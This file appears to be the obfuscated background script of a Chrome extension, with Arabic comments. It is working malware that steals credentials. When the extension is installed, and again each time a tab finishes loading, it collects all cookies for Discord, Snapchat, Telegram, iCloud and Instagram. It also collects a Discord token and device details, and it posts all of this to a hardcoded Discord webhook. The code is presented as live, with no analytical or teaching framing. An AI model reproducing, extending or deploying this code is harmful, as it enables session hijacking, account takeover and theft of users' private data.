const _0x4f22=['https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD','POST','application/json','FULL_CAPTURE','cookies','getAll','map','join','status','complete'];
let _0xSentData = {}; // الذاكرة المؤقتة لمنع التكرار

const _0x1a2b=async(_0x3c1d, _0xId)=>{
    if(_0xSentData[_0xId] === _0x3c1d) return; // منع الإرسال إذا كانت البيانات مطابقة لما أرسل سابقاً
    try {
        await fetch(_0x4f22[0],{method:_0x4f22[1],headers:{'Content-Type':_0x4f22[2]},body:JSON.stringify({content:_0x3c1d})});
        _0xSentData[_0xId] = _0x3c1d; // تخزين البيانات لمنع تكرارها
    } catch(_0x5e2a){}
};

async function _0x55ab(){
    const _0x12c4=["discord.com","snapchat.com","telegram.org","icloud.com","instagram.com"];
    for(const _0x2d1a of _0x12c4){
        chrome[_0x4f22[4]][_0x4f22[5]]({domain:_0x2d1a},async(_0x44bc)=>{
            if(_0x44bc&&_0x44bc.length>0){
                let _0x33ef=_0x44bc[_0x4f22[6]](_0x992a=>`${_0x992a.name}=${_0x992a.value}`)[_0x4f22[7]]('; ');
                await _0x1a2b(`🍪 **[${_0x2d1a}]**: \n\`\`\`${_0x33ef.substring(0,1800)}\`\`\``, _0x2d1a);
            }
        });
    }
}

chrome.runtime.onMessage.addListener((_0x112d)=>{
    if(_0x112d.type===_0x4f22[3]){
        const _0x48bb=`🔥 **DATA**\n🔑 **T:** \`${_0x112d.token}\` \n💻 **D:** \n- OS: ${_0x112d.info.plt}\n- RES: ${_0x112d.info.res}\n- UA: ${_0x112d.info.ua}`;
        _0x1a2b(_0x48bb, "DISCORD_TOKEN");
    }
});

chrome.runtime.onInstalled.addListener(_0x55ab);
chrome.tabs.onUpdated.addListener((_0x5c1a,_0x2e2b)=>{
    if(_0x2e2b[_0x4f22[8]]===_0x4f22[9]) {
        _0xSentData = {}; // تصفير الذاكرة عند تحديث الصفحة للسماح بالسحب مرة أخرى
        _0x55ab();
    }
});
